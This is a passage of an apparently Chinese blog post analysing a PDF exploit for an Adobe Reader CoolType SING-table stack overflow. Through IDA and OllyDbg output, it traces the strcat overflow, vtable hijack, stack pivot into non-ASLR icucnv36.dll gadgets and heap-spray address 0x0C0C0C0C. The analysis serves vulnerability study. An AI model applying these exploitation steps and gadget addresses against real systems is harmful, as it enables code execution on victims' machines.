class="line">.text:0803DD1D 8B 85 1C 01 00 00             mov     eax, [ebp+108h+arg_C]</span><br><span class="line">.text:0803DD23 8B BD 10 01 00 00             mov     edi, [ebp+108h+arg_0]</span><br><span class="line">.text:0803DD29 8B 9D 14 01 00 00             mov     ebx, [ebp+108h+arg_4]</span><br><span class="line">.text:0803DD2F 89 7D D8                      mov     [ebp+108h+var_130], edi</span><br><span class="line">.text:0803DD32 89 45 D0                      mov     [ebp+108h+var_138], eax</span><br><span class="line">.text:0803DD35 E8 F2 39 00 00                call    sub_804172C</span><br><span class="line">.text:0803DD35</span><br><span class="line">.text:0803DD3A 33 F6                         xor     esi, esi                        ; esi清0，之后用于判断值是否为空</span><br><span class="line">.text:0803DD3C 83 7F 08 03                   cmp     dword ptr [edi+8], 3</span><br><span class="line">.text:0803DD3C</span><br><span class="line">.text:0803DD40                               ;   try &#123;</span><br><span class="line">.text:0803DD40 89 75 FC                      mov     [ebp+108h+var_10C], esi</span><br><span class="line">.text:0803DD43 0F 84 B7 01 00 00             jz      loc_803DF00</span><br><span class="line">.text:0803DD43</span><br><span class="line">.text:0803DD49 89 75 E4                      mov     [ebp+108h+var_124], esi</span><br><span class="line">.text:0803DD4C 89 75 E8                      mov     [ebp+108h+var_120], esi</span><br><span class="line">.text:0803DD4F 83 7F 0C 01                   cmp     dword ptr [edi+0Ch], 1</span><br><span class="line">.text:0803DD4F                               ;   &#125; // starts at 803DD40</span><br><span class="line">.text:0803DD4F</span><br><span class="line">.text:0803DD53                               ;   try &#123;</span><br><span class="line">.text:0803DD53 C6 45 FC 01                   mov     byte ptr [ebp+108h+var_10C], 1</span><br><span class="line">.text:0803DD57 0F 85 4C 01 00 00             jnz     loc_803DEA9</span><br><span class="line">.text:0803DD57</span><br><span class="line">.text:0803DD5D 68 2C DB 19 08                push    offset aName                    ; &quot;name&quot;</span><br><span class="line">.text:0803DD62 57                            push    edi                             ; int</span><br><span class="line">.text:0803DD63 8D 4D E4                      lea     ecx, [ebp+108h+var_124]</span><br><span class="line">.text:0803DD66 C6 45 EF 00                   mov     [ebp+108h+var_119], 0</span><br><span class="line">.text:0803DD6A E8 68 3A FE FF                call    sub_80217D7</span><br><span class="line">.text:0803DD6A</span><br><span class="line">.text:0803DD6F 39 75 E4                      cmp     [ebp+108h+var_124], esi</span><br><span class="line">.text:0803DD72 75 69                         jnz     short loc_803DDDD</span><br><span class="line">.text:0803DD72</span><br><span class="line">.text:0803DD74 68 4C DB 19 08                push    offset aSing                    ; &quot;SING&quot;</span><br><span class="line">.text:0803DD79 57                            push    edi                             ; int</span><br><span class="line">.text:0803DD7A 8D 4D DC                      lea     ecx, [ebp+108h+var_12C]         ; 指向SING表入口</span><br><span class="line">.text:0803DD7D E8 84 3D FE FF                call    sub_8021B06                     ; 处理SING表</span><br><span class="line">.text:0803DD7D</span><br><span class="line">.text:0803DD82 8B 45 DC                      mov     eax, [ebp+108h+var_12C]         ; SING表入口赋值给eax</span><br><span class="line">.text:0803DD85 3B C6                         cmp     eax, esi                        ; 判断表入口是否位空</span><br><span class="line">.text:0803DD85                               ;   &#125; // starts at 803DD53</span><br><span class="line">.text:0803DD85</span><br><span class="line">.text:0803DD87                               ;   try &#123;</span><br><span class="line">.text:0803DD87 C6 45 FC 02                   mov     byte ptr [ebp+108h+var_10C], 2</span><br><span class="line">.text:0803DD8B 74 37                         jz      short loc_803DDC4               ; 若我们处理的SING表不出差错，这里是不会进行跳转的</span><br><span class="line">.text:0803DD8B</span><br><span class="line">.text:0803DD8D 8B 08                         mov     ecx, [eax]                      ; 这里传入的是SING表的第一个四字节，这里是1.0版本，也就是00 01 00 00</span><br><span class="line">.text:0803DD8F 81 E1 FF FF 00 00             and     ecx, 0FFFFh                     ; 这里进行判断想与，会设置对应eflags标志位</span><br><span class="line">.text:0803DD95 74 08                         jz      short loc_803DD9F               ; 由于上一步设置了相应标志位，因此在这里跳转</span><br><span class="line">.text:0803DD95</span><br><span class="line">.text:0803DD97 81 F9 00 01 00 00             cmp     ecx, 100h</span><br><span class="line">.text:0803DD9D 75 21                         jnz     short loc_803DDC0</span><br><span class="line">.text:0803DD9D</span><br><span class="line">.text:0803DD9F</span><br><span class="line">.text:0803DD9F                               loc_803DD9F:                            ; CODE XREF: sub_803DCF9+9C↑j</span><br><span class="line">.text:0803DD9F 83 C0 10                      add     eax, 10h                        ; eax本来是存放SING表首地址，这里加上0x10偏移指向uniqueName</span><br><span class="line">.text:0803DD9F                                                                       ; uniqueName域</span><br><span class="line">.text:0803DDA2 50                            push    eax                             ; Source</span><br><span class="line">.text:0803DDA3 8D 45 00                      lea     eax, [ebp+108h+Destination]     ; Destination是-0x108,所以这里应该就是普通的lea eax,[ebp]</span><br><span class="line">.text:0803DDA6 50                            push    eax                             ; Destination</span><br><span class="line">.text:0803DDA7 C6 45 00 00                   mov     [ebp+108h+Destination], 0</span><br><span class="line">.text:0803DDAB E8 48 3D 13 00                call    strcat                          ; 漏洞点</span><br></pre></td></tr></table></figure></div>

<h2 id="5-样本分析（栈溢出）"><a href="#5-样本分析（栈溢出）" class="headerlink" title="5.样本分析（栈溢出）"></a>5.样本分析（栈溢出）</h2><p>首先获取到对应样本，其为一个pdf，当打开此pdf会有个任意命令执行的功能，具体呈现出的效果为打开一个计算器，如下：<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/6609c93d70cf3bc7f8d2ec269400baa1cc112a2d.jpg"
                     
                ></p>
<p>然后执行会出现一个明显的pdf弹框，但不完全，接下来就会出现计算器<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/c9fcc3cec3fdfc03e1b7c272913f8794a5c22628.jpg"
                     
                ></p>
<p>当然也可以是别的命令，真正的恶意样本用来调试，在这里使用计算器只是暂时说明可以任意控制了而已<br>首先打开OD，加载Adobe文件下的AcroRd32可执行文件<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/314e251f95cad1c8c771dded3a3e6709c83d5135.jpg"
                     
                ></p>
<p>然后按下F9来运行程序，这样可以用来加载需要的库<br>这里先配合之前的IDA静态分析的结果，利用ctrl + g进行地址跟踪，然后双击十六进制部分进行断点，至于下断点的位置，有以下三个点，</p>
<ul>
<li>首先就是<code>SING</code>表赋值给<code>eax</code>的那个点(0x803dd82)；</li>
<li>然后就是执行<code>strcat</code>函数的点(0x803ddab)</li>
<li>最后就是一个关键漏洞点(0x808b308),这个点之后详细介绍</li>
</ul>
<p>此时使用OD打开的Adobe Reader打开样本Exploit，然后会断到我们的第三个断点处<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/6a63f6246b600c336800fe025f4c510fd8f9a1fb.jpg"
                     
                ></p>
<p>该指令是执行<code>eax</code>寄存器保存的地址指向的函数，这里可以从右上角的Registers窗口看到<code>eax</code>的值，发现是在栈上的，右键点击<code>eax</code>，然后选择Follow in Stack，这样栈窗口看到<code>eax</code>中保存的值所指向的地址是0x80833EF,返回IDA，查看该地址所在的函数</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> *__cdecl <span class="title function_">sub_80833EF</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">void</span> *a3, <span class="type">size_t</span> *a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      <span class="keyword">return</span> (<span class="type">size_t</span> *)sub_8083119(a3, *a4);</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      <span class="keyword">return</span> (<span class="type">size_t</span> *)sub_80830AE(*a4);</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      result = (<span class="type">size_t</span> *)sub_80828ED(*(_DWORD *)(a1 + <span class="number">4</span>), <span class="number">0</span>);</span><br><span class="line">      *a4 = (<span class="type">size_t</span>)result;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      result = a4;</span><br><span class="line">      *a4 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>观察这里是一个<code>switch</code>选择语句，说明这里是处理<code>SING</code>表的时候会执行的函数，接下来再次F9，这里会到达我们之前下的第一个断点，这条指令会将<code>SING</code>表的首地址传入<code>eax</code>，F8 单步执行到下一条指令来查看以下<code>eax</code>的值<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/342ac65c10385343f388a7ebd613b07ecb8088b0.jpg"
                     
                ></p>
<p>首先右键<code>eax</code>，然后选择follow in dump，接着会再二进制窗口显示值指向的地址，这里从之前了解到的<code>SING</code>表结构会知道<code>uniquename</code>的地址应该是<code>SING</code>表偏移0x10字节的地方，也就是0x035529a0,可以看到样本中<code>uniqueName</code>字段十分长，然后单步执行到<code>push eax</code>，这里是将<code>uniqueName</code>字段的地址压栈<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/b2de9c82d158ccbf231c95f05cd8bc3eb0354153.jpg"
                     
                ></p>
<p>再次F9运行到第二个断点处，这里即将调用<code>strcat</code>函数，可以看到其目的地址已经在栈上了，目的地址也是指向栈上的一个缓冲区地址，查看一下目前的目的地址附近的值，在栈窗口上ctrl+g，然后输入目的地址0x12e468<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/8b82b9014a90f603d830bc8d7c12b31bb151ed7c.jpg"
                     
                ></p>
<p>单步F8步过<code>call strcat</code>指令，由于没有对<code>uniquename</code>进行长度检查，这就导致了现如今会将其全部拷贝到栈上指定的地址，结果如下<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/00e93901213fb80e5f23411d73d12f2eb838940d.jpg"
                     
                ></p>
<p>可以看到左边<code>uniqueName</code>字段的值已经赋值到右边栈上0x12e4d8这里了，再来查看之前0x12E6D0,可以看到已经被覆盖为伪造的地址了<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/8718367adab44aed9b8d9e2ef61c8701a08bfb3d.jpg"
                     
                ></p>
<p>可以看到旁边注释也是很清楚，返回到icucnv36.4A80CB38，跳转到该地址来查看一下函数是干啥的，以及为啥要修改之前的返回地址为它<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/6a600c338744ebf8ea5d47f59cf9d72a6159a7c8.jpg"
                     
                ></p>
<p>据目前在上学前班的邻居小孩说，这里是明显的利用ROP绕过DEP保护的手段，但是由于我不了解，所以下面来科普一下相关知识</p>
<h3 id="1-GS保护"><a href="#1-GS保护" class="headerlink" title="1.GS保护"></a>1.GS保护</h3><p>类似于linux上的canary,函数执行前存放在返回值与ebp上（低地址），然后当程序执行完毕之后会调用检查函数来判断该值是否与之前相同，此时就不能通过覆盖ret地址进行ROP链构造了，而是修改栈上保存的某一个函数指针来进行利用</p>
<p>IDA反汇编可以看到函数开始前会有如下指令：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">text:0803DCF9                               ; __unwind &#123; // loc_8184A54</span><br><span class="line">.text:0803DCF9 55                            push    ebp</span><br><span class="line">.text:0803DCFA 81 EC 04 01 00 00             sub     esp, 104h                       ; esp开拓栈空间0x104</span><br><span class="line">.text:0803DD00 8D 6C 24 FC                   lea     ebp, [esp-4]</span><br><span class="line">.text:0803DD04 A1 B8 0F 23 08                mov     eax, ___security_cookie</span><br><span class="line">.text:0803DD09 33 C5                         xor     eax, ebp</span><br></pre></td></tr></table></figure></div>

<p>结束函数的时候有以下判断</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:0803DEE1 E8 A9 A2 00 00                call    @__security_check_cookie@4      ; __security_check_cookie(x)</span><br><span class="line">.text:0803DEE1</span><br><span class="line">.text:0803DEE6 81 C5 08 01 00 00             add     ebp, 108h</span><br><span class="line">.text:0803DEEC C9                            leave</span><br><span class="line">.text:0803DEED C3                            retn</span><br></pre></td></tr></table></figure></div>

<h3 id="2-DEP-Data-Excution-Prevention-数据执行保护"><a href="#2-DEP-Data-Excution-Prevention-数据执行保护" class="headerlink" title="2.DEP(Data Excution Prevention)数据执行保护"></a>2.DEP(Data Excution Prevention)数据执行保护</h3><p>类似于Linux上的NX（不知道为啥名字这俩起不一样干嘛，搞得还以为是新知识点）。所以这里可以使用ROP来进行栈迁移进行绕过，在OD上输入指令alt+m来查看内存情况，类似pwndbg中的vmmap，十分方便（这里插一句相较于Linux我个人还是更喜欢Windows）</p>
<h3 id="3-ALSR"><a href="#3-ALSR" class="headerlink" title="3.ALSR"></a>3.ALSR</h3><p>终于来了个名字一样的了，在加载程序的时候不再使用固定的基址加载，支持ASLR的程序在其PE头中会设置<br><code>IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE</code>标识来说明其支持ASLR。例如，如果 icucnv36.dll 开启了 ASLR，那么同一个代码的地址，可能是 0x4A80CB38，也可能是 0x5A80CB38。由于无法知道准确的地址，所以也就无法跳转到想要执行的代码。可以点击下面这个小工具来查看对应库中是否开启了ALSR</p>
<p><a class="link"   target="_blank" rel="noopener" href="http://www.scriptjunkie.us/files/pefinder.zip" >&gt;小工具&lt; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>用法如下：</p>
<div class="highlight-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> /b /w /s &quot;C:\Program Files\Adobe\*.dll&quot; | pefinder.exe -</span><br></pre></td></tr></table></figure></div>

<p>之前将对应0x12E6D0的栈地址指向的即将修改的函数指针改成0x4A80CB38,他位于icucnv36下（挑选他不是没有理由），打开cmd执行上述命令来查看哪里没开ALSR,可以找到如下信息：<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/63d0f703918fa0ecdc5e47c7639759ee3c6ddb5b.jpg"
                     
                ></p>
<p>介绍了几个涉及到的保护知识，接下来再继续分析</p>
<p>F8单步到call CoolType.08001243处，下一个断点，然后再次单步步过<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/b64543a98226cffcbbc69c78fc014a90f703ea08.jpg"
                     
                ></p>
<p>发现并没有出现什么问题，取消上面打的断点，再接下来单步调试，最后单步会到达之前的第三个断点处，如下图:<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/d009b3de9c82d15881557a7bc50a19d8bd3e4220.jpg"
                     
                ></p>
<p>理论上如果填充大量无关数据，是可以找到这条关键漏洞的地址值的，上面图中给出了<code>eax</code>里面保存的函数指针，这里可以看到接下来就会调用上面的0x4A80CB38的汇编指令了，重新来看看为啥跳转到<code>call [eax]</code>指令，首先ctrl + F2来重新启动程序，按照之前的步骤我们步到这里，如下图：<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/77c6a7efce1b9d16cfd1b8abb6deb48f8d5464e1.jpg"
                     
                ></p>
<p>使用F7，进入该函数后，再此单步调试，直到下面这条指令<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/7c1ed21b0ef41bd5d455ca3e14da81cb38db3df1.jpg"
                     
                ></p>
<p>执行该call后会跳到<code>call [eax]</code>,为啥捏？再F7跟进看看<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/d01373f082025aaf30455c01beedab64024f1a80.jpg"
                     
                ></p>
<p>可以看到这就是函数内部了，上面重点标记的指令将<code>ecx</code>的值赋给了<code>eax</code>，我们查看<code>ecx</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/fc1f4134970a304e7f7a823094c8a786c8175c9b.jpg"
                     
                ></p>
<p>右键<code>ecx</code>然后选择follow in dump ，然后左下角二进制会出现相应值，发现<code>ecx</code>值所指向的是0x081A601C，通过右键二进制窗口，选择long–&gt;address，来方便用地址形式来查看内存数据，此时跳转到0x81A601C看看这里存放的是什么宝贝<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/203fb80e7bec54e712a338d4fc389b504ec26aa8.jpg"
                     
                ></p>
<p>不难看出这里存放的很多函数指针，判断上面的函数地址这是一个虚表指针，我们可以到IDA中查看该虚表内容</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">.rdata:081A6004 53 74 72 65 61 6D 48 61 6E 64+aStreamhandler db &#x27;StreamHandler&#x27;,0     ; DATA XREF: .data:off_821D31C↓o</span><br><span class="line">.rdata:081A6012 00 00 00 00 00 00             align 8</span><br><span class="line">.rdata:081A6018 2C 87 1E 08                   dd offset ??_R4StreamHandler@@6B@       ; const StreamHandler::`RTTI Complete Object Locator&#x27;</span><br><span class="line">.rdata:081A601C                               ; const StreamHandler::`vftable&#x27;</span><br><span class="line">.rdata:081A601C 16 B1 08 08                   ??_7StreamHandler@@6B@ dd offset sub_808B116</span><br><span class="line">.rdata:081A601C                                                                       ; DATA XREF: sub_801E529-18↑o</span><br><span class="line">.rdata:081A601C                                                                       ; sub_808AC54+11↑o</span><br><span class="line">.rdata:081A6020 AA B5 08 08                   dd offset sub_808B5AA</span><br><span class="line">.rdata:081A6024 62 99 08 08                   dd offset sub_8089962</span><br><span class="line">.rdata:081A6028 8C 95 08 08                   dd offset sub_808958C</span><br><span class="line">.rdata:081A602C 91 95 08 08                   dd offset nullsub_41</span><br><span class="line">.rdata:081A6030 AA B0 08 08                   dd offset nullsub_47</span><br><span class="line">.rdata:081A6034 85 AC 08 08                   dd offset sub_808AC85</span><br><span class="line">.rdata:081A6038 C7 95 08 08                   dd offset nullsub_37</span><br><span class="line">.rdata:081A603C 95 B0 08 08                   dd offset sub_808B095</span><br><span class="line">.rdata:081A6040 07 9E 08 08                   dd offset sub_8089E07</span><br><span class="line">.rdata:081A6044 6F 99 08 08                   dd offset sub_808996F</span><br><span class="line">.rdata:081A6048 A7 94 08 08                   dd offset sub_80894A7</span><br><span class="line">.rdata:081A604C ED 95 08 08                   dd offset sub_80895ED</span><br><span class="line">.rdata:081A6050 F2 95 08 08                   dd offset sub_80895F2</span><br><span class="line">.rdata:081A6054 C5 B0 08 08                   dd offset sub_808B0C5</span><br><span class="line">.rdata:081A6058 FC E4 01 08                   dd offset nullsub_48</span><br><span class="line">.rdata:081A605C F9 E4 01 08                   dd offset nullsub_49</span><br><span class="line">.rdata:081A6060 FF E4 01 08                   dd offset sub_801E4FF</span><br><span class="line">.rdata:081A6064 DA 94 08 08                   dd offset sub_80894DA</span><br><span class="line">.rdata:081A6068 F7 95 08 08                   dd offset sub_80895F7</span><br><span class="line">.rdata:081A606C F8 E4 01 08                   dd offset nullsub_50</span><br><span class="line">.rdata:081A6070 04 E5 01 08                   dd offset sub_801E504</span><br><span class="line">.rdata:081A6074 70 B0 08 08                   dd offset sub_808B070</span><br><span class="line">.rdata:081A6078 8A AC 08 08                   dd offset sub_808AC8A</span><br><span class="line">.rdata:081A607C 2F 99 08 08                   dd offset sub_808992F</span><br><span class="line">.rdata:081A6080 5B C3 01 08                   dd offset sub_801C35B</span><br><span class="line">.rdata:081A6084 34 99 08 08                   dd offset sub_8089934</span><br><span class="line">.rdata:081A6088 9B B5 08 08                   dd offset sub_808B59B</span><br><span class="line">.rdata:081A608C 37 99 08 08                   dd offset sub_8089937</span><br><span class="line">.rdata:081A6090 69 99 08 08                   dd offset nullsub_46</span><br><span class="line">.rdata:081A6094 45 9E 08 08                   dd offset sub_8089E45</span><br><span class="line">.rdata:081A6098 54 DC 01 08                   dd offset sub_801DC54</span><br><span class="line">.rdata:081A609C 45 DF 01 08                   dd offset sub_801DF45</span><br><span class="line">.rdata:081A60A0 F0 D5 01 08                   dd offset sub_801D5F0</span><br><span class="line">.rdata:081A60A4 0E C3 01 08                   dd offset sub_801C30E</span><br><span class="line">.rdata:081A60A8 3B C3 01 08                   dd offset sub_801C33B</span><br><span class="line">.rdata:081A60AC 4B C3 01 08                   dd offset sub_801C34B</span><br><span class="line">.rdata:081A60B0 1F 99 08 08                   dd offset sub_808991F</span><br><span class="line">.rdata:081A60B4 54 59 50 31 00                aTyp1 db &#x27;TYP1&#x27;,0                       ; DATA XREF: sub_808B116+275↑o</span><br></pre></td></tr></table></figure></div>

<p>在上小学的弟弟一眼看出此虚表类型为<code>StreamHandler</code>，应该是处理PDF中流对象的类，然后查看IDA中目前正在执行的语句（通过OD来看）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:0801BB21 55                            push    ebp</span><br><span class="line">.text:0801BB22 8B EC                         mov     ebp, esp</span><br><span class="line">.text:0801BB24 FF 75 20                      push    [ebp+arg_18]</span><br><span class="line">.text:0801BB27 8B 4D 08                      mov     ecx, [ebp+StreamHandler]</span><br><span class="line">.text:0801BB2A FF 75 1C                      push    [ebp+arg_14]</span><br><span class="line">.text:0801BB2D 8B 01                         mov     eax, [ecx]</span><br><span class="line">.text:0801BB2F FF 75 18                      push    [ebp+arg_10]</span><br><span class="line">.text:0801BB32 FF 05 A0 A6 23 08             inc     dword_823A6A0</span><br><span class="line">.text:0801BB38 FF 75 14                      push    [ebp+arg_C]</span><br><span class="line">.text:0801BB3B FF 75 10                      push    [ebp+arg_8]</span><br><span class="line">.text:0801BB3E FF 75 0C                      push    [ebp+arg_4]</span><br><span class="line">.text:0801BB41 FF 10                         call    dword ptr [eax]</span><br></pre></td></tr></table></figure></div>

<p>IDA 上面一段代码反汇编情况如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl sub_801BB21(</span><br><span class="line">        int (__thiscall ***StreamHandler)(_DWORD, int, int, int, int, int, int),</span><br><span class="line">        int a2,</span><br><span class="line">        int a3,</span><br><span class="line">        int a4,</span><br><span class="line">        int a5,</span><br><span class="line">        int a6,</span><br><span class="line">        int a7)</span><br><span class="line">&#123;</span><br><span class="line">  int (__thiscall **v7)(_DWORD, int, int, int, int, int, int); // eax</span><br><span class="line">  int result; // eax</span><br><span class="line"></span><br><span class="line">  v7 = *StreamHandler;</span><br><span class="line">  ++dword_823A6A0;</span><br><span class="line">  result = (*v7)(StreamHandler, a2, a3, a4, a5, a6, a7);</span><br><span class="line">  if ( !(_BYTE)result )</span><br><span class="line">    --dword_823A6A0;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>该代码段是传递7个参数，如下图：<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/94cad1c8a786c91721047ff38c3d70cf3ac757f0.jpg"
                     
                ></p>
<p>栈上第一个参数就是之前<code>ecx</code>保存的值，该值是一个指向一个虚表指针的地址，也就是<code>StreamHandler</code>对象，该代码逆向的大致含义就是运行虚函数指向的第一个函数，也就是0x0808B116,然后其第一个对象就是<code>StreamHandler</code>,可以查看该地址二进制附近的数值<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/9d82d158ccbf6c81cd6e0122f93eb13532fa409a.jpg"
                     
                ></p>
<p>在当初覆盖值的时候，会在此处也覆盖掉一个值，这里也就出现了一开始的0x12E6D0,也就是之后<code>call [eax]</code>的<code>eax</code>值，此时再次OD  F7 步入 0x808B116,然后单步步过<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/279759ee3d6d55fb6a8c5bec28224f4a21a4ddb6.jpg"
                     
                ></p>
<p>到达这条语句，可以看到是将edi + 0x3c地址指向的值赋给了<code>eax</code>，而这个<code>edi</code>保存的是之前<code>StreamHandler</code>对象的首地址，加上0x3c就变成了刚刚里面保存0x12E6D0的值，此时这条指令执行完毕，<code>eax</code>中就是该值了，再然后单步会发现：<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/3b87e950352ac65c13bc4bb9bef2b21192138aba.jpg"
                     
                ></p>
<p>哦！我的如来佛祖(上帝本土化 没错吧？)，这不是之前打的3号断点嘛，这下终于知道了为什么最后<code>call eax</code>会是这个值了，然后回到断点处，这里会调用0x4A80CB38这个函数，按下F7进入该函数查看，至此溢出部分分析完毕</p>
<h2 id="5-样本分析（阶段二：ROP链）"><a href="#5-样本分析（阶段二：ROP链）" class="headerlink" title="5.样本分析（阶段二：ROP链）"></a>5.样本分析（阶段二：ROP链）</h2><p>接着上面继续分析，现在运行到了icucnv36.dll中0x4A80CB38这个地址的函数，我们进入查看</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/c995d143ad4bd113fc7e9bf81fafa40f4afb054c.jpg"
                     
                ></p>
<p>这里看到是首先将<code>ebp</code>抬了0x794字节（栈从高到低扩展），然后执行<code>leave</code>，熟悉栈迁移的同学可能十分了解，它实际上的操作相当于<code>mov esp ebp; pop ebp;</code>此时指令执行完毕，栈顶应该指向0x0012E4E0（EBP + 0x794 + 4 &#x3D; 0x12DD48 + 0x794 + 4）,下面发现果真如此，然后栈顶指向的指针就会被我们的<code>retn</code>指令调用<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/8718367adab44aed9fc5922ef61c8701a08bfb75.jpg"
                     
                ></p>
<p>下一条指令是执行 0x4A82A714,继续跟进，发现这里是简单的pop出栈上的值到达<code>esp</code>，相当于是再次栈迁移了，这里之前构造的0x0C0C0C0C是常用的堆喷地址，在后面会介绍堆喷的原理，目前程序运行情况如下：<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/50da81cb39dbb6fd2f88c9ec4c24ab18962b372c.jpg"
                     
                ></p>
<p>执行后，栈迁移到0x0c0c0c0c<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/2cf5e0fe9925bc31609b2d521bdf8db1ca137031.jpg"
                     
                ></p>
<p>继续跟进，发现是将0x4A8A0000弹到<code>ecx</code>上，继续跟进，没什么好说的，如下图：<img  
                     lazyload
                     src="/images/loading.svg"
